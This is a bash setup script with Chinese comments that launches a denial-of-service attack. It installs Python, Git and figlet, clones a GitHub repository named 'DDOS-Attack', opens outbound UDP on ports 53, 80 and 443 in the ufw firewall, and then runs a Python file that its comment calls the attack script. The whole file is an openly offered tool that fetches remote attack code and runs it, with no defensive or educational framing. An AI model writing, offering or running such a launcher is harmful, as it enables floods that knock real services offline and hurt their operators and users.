#!/bin/bash

# 1. 安装必要的软件包
echo "正在安装 Python3, Git, figlet..."
if command -v apt &> /dev/null; then
    sudo apt update
    sudo apt install -y python3 python3-pip git figlet
elif command -v yum &> /dev/null; then
    sudo yum install -y python3 python3-pip git figlet
elif command -v apk &> /dev/null; then
    sudo apk add python3 py3-pip git figlet
else
    echo "无法识别包管理器，请手动安装 python3, git, figlet"
    exit 1
fi

# 2. 克隆项目
echo "正在克隆 DDOS-Attack 仓库..."
git clone https://github.com/BC-809/DDOS-Attack.git
cd DDOS-Attack || exit 1

# 3. Linux 防火墙放行 Python（可选，有些系统不需要）
echo "配置防火墙（如果已启用）..."
if command -v ufw &> /dev/null && sudo ufw status | grep -q "Status: active"; then
    sudo ufw allow out from any to any port 53,80,443 proto udp
    echo "已临时放行常用端口的 UDP 出站流量"
fi
# 注意：iptables 通常不限制出站，一般无需配置

# 4. 执行攻击脚本
echo "准备执行 DDOS/01_UsePython.py ..."
python3 DDOS/01_UsePython.py
